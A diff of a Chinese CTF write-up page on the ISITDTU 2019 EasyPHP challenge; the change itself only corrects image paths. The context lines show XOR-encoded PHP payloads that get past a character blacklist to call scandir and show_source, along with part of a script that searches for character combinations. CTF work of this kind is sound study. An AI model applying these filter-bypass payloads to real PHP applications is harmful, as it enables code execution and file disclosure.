@@ -629,7 +629,7 @@ if ( preg_match(&#39;/[\x00- 0-9\&#39;&#34;`$&amp;amp;.,|[&amp;#123;_defgops\x7F
 或
 ?_&#x3D;(%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815190330822.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815190330822.png"></p>
 <p>命令执行的几个函数都被禁用了，就得想其他办法。</p>
 <p>可以构造</p>
 <pre class="line-numbers language-none"><code class="language-none">print_r(scandir(.));
@@ -660,7 +660,7 @@ p <span class="token operator">=</span> <span class="token builtin">list</span><
                                 en<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                         <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815235405221.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815235405221.png"></p>
 <p>挑些出现次数较少的字符替换一下，比如</p>
 <p>原来是t，我选<code>t==s^d^c     %8b  =&gt;  %8c  %9b  %9c</code></p>
 <pre class="line-numbers language-none"><code class="language-none">(%8b)^(%ff)
@@ -708,7 +708,7 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
 <p>读目录payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815225505661.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815225505661.png"></p>
 <p>读flag，用<code>end()</code>代替数组选择。</p>
 <pre class="line-numbers language-none"><code class="language-none">show_source(end(scandir(.)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
